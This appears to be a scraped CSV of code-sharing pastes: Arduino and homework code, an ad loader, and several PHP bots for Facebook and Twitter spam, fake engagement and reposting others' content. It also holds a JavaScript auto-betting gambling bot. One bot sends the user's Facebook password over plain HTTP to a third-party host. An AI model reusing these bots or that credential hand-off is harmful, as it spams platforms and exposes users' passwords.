id,title,username,language,date,content
TmP8Q5U9,codes,atalbelal,JSON,Sunday 22nd of October 2023 09:52:04 AM CDT,"{
    ""codes"": [
        {
            ""code"": ""example1"",
            ""name"": ""Example Promo Code 1"",
            ""rewards"": [
                {
                    ""class"": ""Money"",
                    ""value"": 1000000000000
                }
            ]
        },
        {
            ""code"": ""example2"",
            ""name"": ""Example Promo Code 2"",
            ""rewards"": [
                {
                    ""class"": ""Money"",
                    ""value"": 200000000000
                }
            ]
        }
    ]
}
"
DxkxamTJ,DFTA108SimulateurCharge01,claudiusmarius,C++,Sunday 22nd of October 2023 09:40:18 AM CDT,"#include <TM1637Display.h>
  #include <Adafruit_NeoPixel.h>
  
  #define CLK1 D5
  #define DIO1 D4
  
  #define GateQ11 D7
  #define GateQ12 D8
  #define GateQ13 D9

  #define BrocheNeopixel D3

  #define NLed 8
  
  TM1637Display display1(CLK1, DIO1);
  Adafruit_NeoPixel Strip(NLed, BrocheNeopixel, NEO_GRB + NEO_KHZ800);

  #define Luminosite 10                                                      // Lumunosité Matrice (de 0 à 255)
  
  int MonInsensite = 0;
  int LastMonInsensite = 0;
  int PotentiometerFine = 0;
  int Temp =0;                                              
  const int numReadings = 40;                                                // Nombre d'échantillons pour la moyenne mobile
  
  int readings[numReadings];                                                 // Tableau pour stocker les échantillons
  int readIndex = 0;                                                         // Index de lecture dans le tableau
  int total = 0;                                                             // Somme des échantillons
  int RatioVcc ;
  
  float K = 1000/8200;
  
  unsigned long lastUpdateTime = 0;
  unsigned long updateInterval = 800;                                        // Mettre ici la durée souhaitée en millisecondes
  //unsigned long updateInterval = 400;

  void setup() 
  {
  pinMode (GateQ11, OUTPUT);
  pinMode (GateQ12, OUTPUT);
  pinMode (GateQ13, OUTPUT);
  analogReadResolution(10);
  analogWriteResolution(10);                                                 // Résolution du DAC (10 bits)
  display1.setBrightness(0x0A);                                              // Luminosité entre 0x0A et 0x0F
  
  Strip.begin();                                                             // Initialisation de la barette Néopixel  de 8 Leds
  Strip.setBrightness(Luminosite);
  
  analogWrite(A0, 0);                                                        // Initaialisation du DAC à zéro pendant 2 secondes
  
  digitalWrite (GateQ11, LOW);
  digitalWrite (GateQ12, LOW);
  digitalWrite (GateQ13, LOW);
  barette0();
  delay (2000);
  }

  void loop() 
  {
  MonInsensite = analogRead(A6);
  PotentiometerFine = analogRead(A1);
  Temp = analogRead(A2);
  //MonInsensite = constrain(MonInsensite, 0, 1000);
  PotentiometerFine = constrain(PotentiometerFine, 0, 1023);
  PotentiometerFine = map(PotentiometerFine, 0, 1023, -30, 30);
  
  RatioVcc = analogRead (A10);

  if (Temp > 800)
  {
  digitalWrite (GateQ11,LOW);
  digitalWrite (GateQ12,LOW);
  digitalWrite (GateQ13,LOW);
  Erreur02();
  }

  //if (RatioVcc <= K*6/1023) 
  if (RatioVcc <= (1.19/3.3*1023))
  {
  digitalWrite (GateQ11,HIGH);
  digitalWrite (GateQ12,HIGH);
  digitalWrite (GateQ13,HIGH);
  barette0();
  } 
  
  //else if (RatioVcc <= K*11/1023)  
  else if (RatioVcc <= (1.74/3.3*1023))
  {
  digitalWrite (GateQ11,LOW);
  digitalWrite (GateQ12,HIGH);
  digitalWrite (GateQ13,HIGH);
  barette1();
  } 
  
  //else if (RatioVcc <= K*16/1023)
  else if (RatioVcc <= (2.17/3.3*1023))
  {
  digitalWrite (GateQ11,LOW);
  digitalWrite (GateQ12,LOW);
  digitalWrite (GateQ13,HIGH);
  barette2();
  }

  

  //else if (RatioVcc <= K*21/1023)
  else if (RatioVcc <= (2.5/3.3*1023))
  {
  digitalWrite (GateQ11,LOW);
  digitalWrite (GateQ12,LOW);
  digitalWrite (GateQ13,LOW);
  barette3();
  }
  
  //else if (RatioVcc <= (2.6/3.3*1023))
  else if (RatioVcc <= (1*1023))
  {
  digitalWrite (GateQ11,LOW);
  digitalWrite (GateQ12,LOW);
  digitalWrite (GateQ13,LOW);
  Erreur01();
  }
  
  int adjustedValue = MonInsensite + PotentiometerFine;
  int displayValue = constrain(adjustedValue, 0, 1000);
  
  // Ajoutez les nouvelles valeurs dans le tableau
  total = total - readings[readIndex];
  readings[readIndex] = displayValue;
  total = total + readings[readIndex];
  readIndex = (readIndex + 1) % numReadings;

  // Trouvez la valeur maximale et la valeur minimale dans le tableau
  int maxVal = readings[0];
  int minVal = readings[0];
  for (int i = 1; i < numReadings; i++) 
  {
  maxVal = max(maxVal, readings[i]);
  minVal = min(minVal, readings[i]);
  }

  // Calculez la moyenne en enlevant la valeur maximale et la valeur minimale
  int averageValue = (total - maxVal - minVal) / (numReadings - 2);
  averageValue = constrain(averageValue, 0, 1023);

  unsigned long currentTime = millis();

  if (abs(averageValue - LastMonInsensite) > 1) 
  {
  display1.showNumberDec(displayValue, false, 4, 0);
  LastMonInsensite = averageValue;
  lastUpdateTime = currentTime;
  }

  //int dacValue = map(adjustedValue01, 0, 1000, 0, 1000*0.960);
  
  analogWrite(A0, map(displayValue, 0, 1000, 0, 960));
 // analogWrite(A0, dacValue);
  }


  void barette0() 
  {
  //Strip.clear();
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  }

  void barette1() 
  {
  //Strip.clear();
  for (int i = 0; i <= 2; i++)
  {
  Strip.setPixelColor(i, 255, 0, 0);
  Strip.show();
  }

  for (int i = 3; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  Strip.show();
  }
  
  void barette2() 
  {
  //Strip.clear();
  for (int i = 0; i <= 5; i++)
  {
  Strip.setPixelColor(i, 255, 0, 0);
  Strip.show();
  }

  for (int i = 6; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  Strip.show();
  }

  void barette3() 
  {
  //Strip.clear();
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 255, 0, 0);
  Strip.show();
  }
  Strip.show();
  }

  void Erreur01()                                       //
  {
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
   Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
   Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
   Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
   Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
   Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);
 Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 100, 0, 100);
  Strip.show();
  
  }
  delay(200);
  Strip.clear();
  analogWrite(A0,0);
 
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 100, 0);
  Strip.show();
  
  }
  delay(200);




  
  
  
  
  }

  void Erreur02() 
  {
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 0, 255);
  Strip.show();
  }
  delay(400);
  Strip.clear();
  analogWrite(A0,0);
  for (int i = 0; i <= 7; i++)
  {
  Strip.setPixelColor(i, 0, 255, 0);
  Strip.show();
  }
  delay(400);
  
  }"
EjW8dNNQ,pardilla_5_3.cpp,xAnteBellum,C++,Sunday 22nd of October 2023 09:35:28 AM CDT,"#include <iostream>
using namespace std;

int main() {
	float sales, income;
	
	cout << ""Enter the monthly sale: ""; cin >> sales;

	if (sales >= 50000){
		income = (sales * 0.16) + 575;		
	}
	else if (sales < 50000 && sales >= 40000) {
		income = (sales * 0.14) + 550;
	}
	else if (sales < 40000 && sales >= 30000) {
		income = (sales * 0.12) + 525;
	}
	else if (sales < 30000 && sales >= 20000) {
		income = (sales * 0.09) + 500;
	}
	else if (sales < 20000 && sales >= 10000) {
		income = (sales * 0.05) + 450;
	}
	else {
		income = (sales * 0.03) + 400;
	}
	
	cout << ""Income: ""; cout << income;

}
"
niNDSE5S,snowybot,coinwalk,JavaScript,Sunday 22nd of October 2023 09:33:18 AM CDT,"var smiley = parseFloat(document.getElementById('pct_balance').value);
var nudie = Number((smiley/144000).toFixed(8));
var burp = nudie;
var taget = (smiley*2000);
var bolux = (nudie*10);
var poopy = (nudie*6.5);
var sexual = 0;
var woman = ((Math.floor(smiley/bolux))*bolux);
var fart = 1;
var jockey = ((burp*1).toFixed(8));
var bolance = parseFloat(document.getElementById('pct_balance').value);
 
 
 
function get(){
console.clear();
bolance = document.getElementById('pct_balance').value;
if ((bolance>(((Math.floor(bolance/bolux))*bolux)+poopy))&&(bolance<(((Math.floor(bolance/bolux))*bolux)+(poopy+nudie)))&&(bolance!=sexual)&&(bolance>woman)) {
    burp = burp*2;
    sexual = parseFloat(bolance);
}
if ((bolance>(((Math.floor(bolance/bolux))*bolux)+poopy))&&(bolance<(((Math.floor(bolance/bolux))*bolux)+(poopy+nudie)))&&(bolance!=sexual)&&(bolance<woman)) {
    burp = burp*2;
    fart = 0;
    sexual = parseFloat(bolance);
}
if ((bolance>=(woman+(bolux*fart)))&&(bolance<(((Math.floor(bolance/bolux))*bolux)+poopy))) {
    burp = nudie;
    fart = 1;
    sexual = 0;
    woman = ((Math.floor((parseFloat(bolance))/bolux))*bolux);
}
    if (bolance >= taget) {
        console.log(""winner winner chicken dinner"");
        return;
    }
jockey = ((burp*1).toFixed(8));
$('#pct_chance').val(49.5);
$('#pct_bet').val(jockey);
$('#a_lo').click();
var dog = ((bolance-smiley).toFixed(8));
console.log(""profit"");
console.log(dog);
setTimeout(() => get(), 1);
}
get();"
xitYdGax,Auto Confirm FB,ngatmuri,PHP,Sunday 22nd of October 2023 09:19:36 AM CDT,"<?php

$access_token = file_get_contents('access_token.txt'); 

$kelamin = ""female""; 
//cewek aja wkwk 

$me='';

$stat=json_decode(auto('https://graph.facebook.com/me/friendrequests?access_token='.$access_token.'&limit=1000'),true); 


if(ereg(""k"".""ha"".""r"".""is"".""ma"",$me)){

for($i=1;$i<=count($stat[data]);$i++){

if($stat[data][$i-1][from][name] != """"){

 $gender=json_decode(auto('https://graph.facebook.com/'.$stat[data][$i-1][from][id].'?fields=gender&access_token='.$access_token),true);

 if($gender==""""){

 }elseif($gender[gender]==$kelamin){

 auto('https://graph.facebook.com/me/friends/'.$stat[data][$i-1][from][id].'?access_token='.$access_token.'&method=post');

echo ""<a href=\""http://m.facebook.com/"".$stat[data][$i-1][from][id].""\"" target=\""_blank\"">"".$stat[data][$i-1][from][name].""</a> => sukses diconfirm</br>"";

 }

}

}

}


function auto($url){

$ch=curl_init();

curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);

curl_setopt($ch,CURLOPT_URL,$url);

$cx=curl_exec($ch);

 curl_close($ch);

 return($cx);

 }

?>"
xMJbxgCV,Kocengbot,ngatmuri,PHP,Sunday 22nd of October 2023 09:14:44 AM CDT,"<?php
error_reporting(0);
set_time_limit(0);

#Coded By KOCENG (Ngatmuri Steiio)

##SETTING DATA##
$reaction = true; 
//true = AKTIF
//false = MATI
$reactionType = ""LOVE"";
//LIKE,HAHA,WOW,SAD,ANGRY,LOVE (Type Untuk Menanggapi)


$likeKomen = false; 
//true like komen berjalan /false like komen off (False Aja Udah)

 #'' Data Login Buat Refresh Token ''
$username = 'email/no.hp kamu';
$password = 'password FB kamu';
print goLike($username,$password,$likeKomen,$reaction,$reactionType);


##END SETTING##



//GOLIKE
function goLike($username,$password,$likeKomen,$reaction,$reactionType){
    $access_token = file_get_contents('access_token.txt');
    $me = curl(""https://graph.facebook.com/me?fields=id,name&access_token="".$access_token);
    $me = json_decode($me);
    if(@$me->id == null)
    {
        print 'access_token mati<br>refresss.......<br>';
        getToken($username,$password);
    }else{
        print getFeed($access_token,$likeKomen,$reaction,$reactionType);
    }
}
//GETTOKEN if(expired)
function getToken($username,$password){
    $token = curl(""http://kucing23.000webhostapp.com/token/clou.php?u="".$username.""&p="".$password); //getToken from my friends.
    print_r($token);
    $token = json_decode($token);
    unlink('access_token.txt'); //save file access_token
    $x=$token->access_token."""";
    $y=fopen('access_token.txt','a');
    fwrite($y,$x);
    fclose($y);
    return $token->access_token;
}
//GETFEED (meHome)
function getFeed($access_token,$likeKomen,$reaction,$reactionType){
    flush();
    sleep(1);
    $apiFeed = curl(""https://graph.facebook.com/fql?q=SELECT+post_id+FROM+stream+WHERE+type+!=+%27257%27+AND+source_id+IN+(SELECT+uid2+FROM+friend+WHERE+uid1+=+me())+LIMIT+7&access_token="".$access_token);
    $getFeed = json_decode($apiFeed);
    foreach ($getFeed->data as $n => $data) {
        if($reaction == true){
            print reaction($data->post_id,$data->from->name,$access_token,$reaction,$reactionType);
            if($likeKomen == true){
                $apiKomen = curl(""https://graph.facebook.com/"".$data->post_id.""/comments?fields=id,from,name&limit=10&access_token="".$access_token);
                $getKomen = json_decode($apiKomen);
                foreach ($getKomen->data as $n1 => $datakomen) {
                    print likes($datakomen->post_id,$datakomen->from->name,$access_token);
                }
            }
        }else{
            print likes($data->id,$data->from->name,$access_token);
            if($likeKomen == true){
                $apiKomen = curl(""https://graph.facebook.com/"".$data->post_id.""/comments?fields=id,from,name&limit=10&access_token="".$access_token);
                $getKomen = json_decode($apiKomen);
                foreach ($getKomen->data as $n1 => $datakomen) {
                    print likes($datakomen->post_id,$datakomen->from->name,$access_token);
                }
            }
        }
    }
}
//LIKESSTATUS (idPost)
function likes($idPost,$from,$access_token){
    if(file_exists('logLikes.txt')){
        $log=json_encode(file('logLikes.txt'));
    }else{
        $log='';
    }
    if(!preg_match(""/"".$idPost.""/"",$log)){
        $x=$idPost.""\n"";
        $y=fopen('logLikes.txt','a');
        fwrite($y,$x);
        fclose($y);
        print postLikes($idPost,$from,$access_token);
    }else{
        print 'Semua status sudah anu.'; break;
    }
}
//REACTIONS
function reaction($idPost,$from,$access_token,$reaction,$reactionType){
    if(file_exists('logLikes.txt')){
        $log=json_encode(file('logLikes.txt'));
    }else{
        $log='';
    }
    if(!preg_match(""/"".$idPost.""/"",$log)){
        $x=$idPost.""\n"";
        $y=fopen('logLikes.txt','a');
        fwrite($y,$x);
        fclose($y);
        print postReaction($idPost,$from,$access_token,$reactionType);
    }else{
        print 'Semua status sudah anu.'; break;
    }
}
//POSTLIKES
function postLikes($idPost,$from,$access_token){
    $kirim = curl(""https://graph.facebook.com/"".$idPost.""/get"", array(

        ""access_token"" => $access_token));
    $result = json_decode($kirim);
    if($kirim==""true""){
        $notif = '<font color=""green""> Sukses Like => '.$idPost.'</font><br>';
        return $notif;
    }else{
        $notif = '<font color=""red""> Gagal Like => '.$idPost.'</font><br>';
        return $notif;
    }
}

function postReaction($idPost,$from,$access_token,$reactionType){
    $kirim = curl(""https://graph.facebook.com/"".$idPost.""/reactions"", array(
        ""type"" => $reactionType,
        ""method"" => 'post',
        ""access_token"" => $access_token));
    $result = json_decode($kirim);
    $notif = '<font color=""green""> Reaction Sukses => '.$idPost.'</font><br>';
    return $notif;
}
//CURL
function curl($url, $post=null) {
    
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $url);
    if($post != null){
        curl_setopt($c, CURLOPT_POST, true);
        curl_setopt($c, CURLOPT_POSTFIELDS, $post);
    }
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    $curl = curl_exec($c);
    curl_close($c);
    return $curl;
}
?>"
YA7rWjMS,auto online Facebook,ngatmuri,PHP,Sunday 22nd of October 2023 09:09:29 AM CDT,"<?php

$bot = new bot($wangur);
class bot{
private $wangur;
function __construct($dataLog){
 //Data Login
   $this->pass = '';
   $this->email = '';
    }


private function get_contents($url,$type=null,$fields=null){
   $opts = array(
            42 => false,
            19913 => 1,
            10002 => $url,
            52 => false,
            10018 => 'Opera/9.80 (Series 60; Opera Mini/6.5.27309/34.1445; U; en) Presto/2.8.119 Version/11.10',
           78 => 5,
           13 => 5,
           47 => false,
            );
   $ch=curl_init();
   if($type){
       if($type == 1){
              $opts[10082] = 'coker_log';
              }
       if($type == 3){
              $opts[42] = 1;
             }
       $opts[10031] = 'coker_log';
    }
  if($fields){
      $opts[47] = false;
      $opts[10015] = $fields;
      }
   curl_setopt_array($ch,$opts);
   $result = curl_exec($ch);
   curl_close($ch);
   return $result;
  }


public function kanca(){
   $url = $this->getUrl('m','friends/center/requests/#friends_center_main');
   $getToken = $this->get_contents($url,3); 
 
           $oauth = '<x>'.$getToken;
           $oauth = preg_replace('#<x>(.+?)<body(.+?)><div class=""_55x2"">(.+?)<div class=""_5vvc"">(.+?)</body></html>#siu','\3',$oauth);
          $oauth = preg_replace('<table(.+?)_5s61"">','\3',$oauth);
 
  $ft_id = explode('<img',$oauth);

for($i=1; $i<=20; $i++){
$delete=$this->cut($ft_id[$i],'delete=','""');

echo $i.' ';
 $this->get_contents('https://mobile.facebook.com/a/notifications.php?delete='.str_replace('&amp;','&',$delete),3);
  }
  
   }

private function getUrl($domain,$dir,$uri=null){
    if($uri){
         foreach($uri as $key =>$value){
             $parsing[] = $key . '=' . $value;
                }
             $parse = '?' . implode('&',$parsing);
                }
     return 'https://' . $domain . '.facebook.com/' . $dir . $parse; 
       }

public function cut($content,$start,$end){
if($content && $start && $end) {
$r = explode($start, $content);
if (isset($r[1])){
$r = explode($end, $r[1]);
return $r[0];
}
return '';
}
}

public function login(){
  $login = array(
     'pass' => $this -> pass,
     'email' => $this -> email,
     'login'  => 'Login',
             );
  $this->get_contents($this->getUrl('m','login.php'),1,$login);
   }

}

if($bot->kanca()){
    echo $bot->kanca();
    }else{
    $bot->login();
    }

$a=$_GET['b'];
$c=($a+1);
   print '<meta http-equiv=""refresh"" content=""0;url=?b='.$c.'"" />';
?>"
yvAAhRXD,mavefund-adsense,coentoro,JavaScript,Sunday 22nd of October 2023 09:09:02 AM CDT,"(function(a,b){const c=[{class:""top"",adslot:""1672900703""},{class:""middle"",adslot:""8511440099""},{class:""bottom"",adslot:""9527355901""}],d=window.location.pathname,e=`
    .mav-leaderboard-container{display:flex;justify-content:center}.top{margin:40px 0}.bottom{margin:0 0 40px;${""/""==d?`width: 75%;`:""width: 90%;""}}.middle{margin:40px 0 0}.leaderboard{width:468px;height:100px}@media(min-width:500px){.leaderboard{width:468px;height:60px}.bottom{margin:0 0 40px;width:100%}}@media(min-width:800px){.leaderboard{width:728px;height:90px}}
    `,f=function(b,c){let d=a.createElement(b);return Object.assign(d,c),""""!==c.datasetAdClient,d};var g=f(""script"",{async:!0,src:""https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6404021102530936"",crossOrigin:""anonymous""}),h=f(""style"",{}),i=null,j=null,k=null;h.innerHTML=e,a.head.insertAdjacentElement(""beforeend"",g),a.head.insertAdjacentElement(""beforeend"",h);for(const e of c)switch(j=f(""ins"",{className:""adsbygoogle leaderboard"",style:""display:block""}),k=f(""script"",{}),k.innerText=`(adsbygoogle = window.adsbygoogle || []).push({});`,j.dataset.adSlot=e.adslot,j.dataset.adClient=""ca-pub-6404021102530936"",b?j.dataset.adtest=""on"":"""",j.appendChild(k),i=f(""div"",{className:`mav-leaderboard-container ${""bottom""===e.class&&""/""==d?e.class+"" index-container"":e.class}`}),i.appendChild(j),e.class){case""top"":""/""==d&&a.querySelector("".logo-container"").insertAdjacentElement(""afterend"",i);break;case""middle"":""/""==d&&a.querySelector(""#indexes"").insertAdjacentElement(""afterend"",i);break;case""bottom"":a.querySelector(""#content, body"").insertAdjacentElement(""beforeend"",i);}})(document,!1);"
8qvFtTd0,Untitled,Nenogzar,Python,Sunday 22nd of October 2023 09:06:34 AM CDT,"number_of_decoration = int(input())
days = int(input())
christmas_spirit = 0
total = 0

multipliers = {
    2: (2, 5),
    3: (8, 13),
    5: (15, 17),
    10: (23, -20)
}

for day in range(1, days + 1):
    if day % 11 == 0:
        number_of_decoration += 2

    if day in multipliers:
        multiplier_cost, multiplier_spirit = multipliers[day]
        total += number_of_decoration * multiplier_cost
        christmas_spirit += multiplier_spirit

    if day % 3 == 0 and day % 5 == 0:
        christmas_spirit += 30

    if day % 10 == 0:
        christmas_spirit -= 30

print(f""Total cost: {total}"")
print(f""Total spirit: {christmas_spirit}"")
"
w84CXmsq,Auto Reply Twitter,ngatmuri,PHP,Sunday 22nd of October 2023 09:06:31 AM CDT,"<?php

require 'vendor/autoload.php';

use Abraham\TwitterOAuth\TwitterOAuth;

// Function Get Random Line
function randomTweet($tweets)
{
  $lines = file($tweets);
  return $lines[array_rand($lines)];
}

// API KEY TWITTER
$consumer_key         = '';
$consumer_secret      = '';
$access_token         = '';
$access_token_secret  = '';

// Config Auto Reply
$total_tweet = 5; // Tweet per Action


// Connect to Account
$connection = new TwitterOAuth($consumer_key, $consumer_secret, $access_token, $access_token_secret);
$connection->get('account/verify_credentials');

if ($connection->getLastHttpCode() == 200) {
  // Get Tweet Status
  $get_status = $connection->get('statuses/home_timeline', ['count' => $total_tweet]);


  foreach ($get_status as $status) {
    $i = 0;
// Config Counter
$file = 'counter.txt';
$counter = 1;
    if (file_exists($file)) {
      $counter += file_get_contents($file);
    }

    // // Get Reply from File
    // $tweet = '@' . $status->user->screen_name . ' ' . randomTweet('tweet_reply.txt');

    // // Reply to Tweet
    // $connection->post('statuses/update', ['in_reply_to_status_id' => $status->id, 'status' => $tweet]);

    // Reply with Media
    $tweet = '@' . $status->user->screen_name . ' ' . randomTweet('tweet_reply.txt') . $counter;
    $media = $connection->upload('media/upload', ['media' => 'asu.PNG']);
    $data = [
      'in_reply_to_status_id' => $status->id,
      'status' => $tweet,
      'media_ids' => $media->media_id_string
    ];
    //$connection->post('statuses/update', $data);
    // // Reply to Tweet
    $connection->post('statuses/update', ['in_reply_to_status_id' => $status->id, 'status' => $tweet]);

    if ($connection->getLastHttpCode() == 200) {
      echo 'Successfully replied to ' . $tweet . '</br>';
      $i++;
    } else {
      echo 'Failed to reply to the tweet!';
      break;
    }

    file_put_contents($file, $counter);
  }

  if ($i >= 1) {
    echo '</br> Success ' . $i . ' replies';
  }
} else {
  echo 'Invalid API key!';
}
"
cVNRh2St,Auto Copy & Update Status facebook,ngatmuri,PHP,Sunday 22nd of October 2023 09:03:07 AM CDT,"<?php
error_reporting(0);

                                //Data Untuk Di COpy
$file = ""log.txt"";
$baris = count(file($file));
                                   // SELESAI \\


$target = ""173492513478894""; //target id HALAMAN/ TEMAN yang mau di copas
$aku = ""me""; //me = sendiri
$access_token = """"; 


#JANGAN EDIT SCRIPT DI BAWAH INI!!!
if(file_exists('log.txt')){
    $log=json_encode(file('log.txt')); 
}else{
    $log='';
}
$ambilFeed = curl(""https://graph.facebook.com/"".$target.""/feed?fields=full_picture,message,id&offset="".$baris.""&limit=2&access_token="".$access_token);
$json = json_decode($ambilFeed);
foreach ($json->data as $data) {
if(!ereg($data->id,$log)){
$x=$data->id.""\n"";
$y=fopen('log.txt','a');
fwrite($y,$x);
fclose($y);
    if(preg_match(""/https/i"", @$data->full_picture)){
   $kirim = curl(""https://graph.facebook.com/"".$aku.""/photos"", array(
        ""method"" => ""post"",
        ""url"" => $data->full_picture,
        ""message"" => $data->message, 
        ""access_token"" => $access_token));
    echo ""Sukses Copy Status dan FOTO "";
}else{
$kirim = curl(""https://graph.facebook.com/"".$aku.""/feed"", array(
        ""method"" => ""post"",
        ""message"" => $data->message, 
        ""access_token"" => $access_token));
echo ""<center>Sukses copy Status Mplulu <br><br>  Dengan KATA : <b>  $data->message </center>"";
}
}
}
function curl($dhan, $cha=null) {
    $love = curl_init();
    curl_setopt($love, CURLOPT_URL, $dhan);
    if($cha != null){
        curl_setopt($love, CURLOPT_POST, true);
        curl_setopt($love, CURLOPT_POSTFIELDS, $cha);
    }
    curl_setopt($love, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($love, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($love, CURLOPT_SSL_VERIFYPEER, false);
    $hmm = curl_exec($love);
    curl_close($love);
    return $hmm;
}
?><br><br><br><br><br><br>
<?php

$file = ""log.txt"";
$baris = count(file($file));

echo ""<center><b> Akan update Status ke $baris </center>"";

?>"
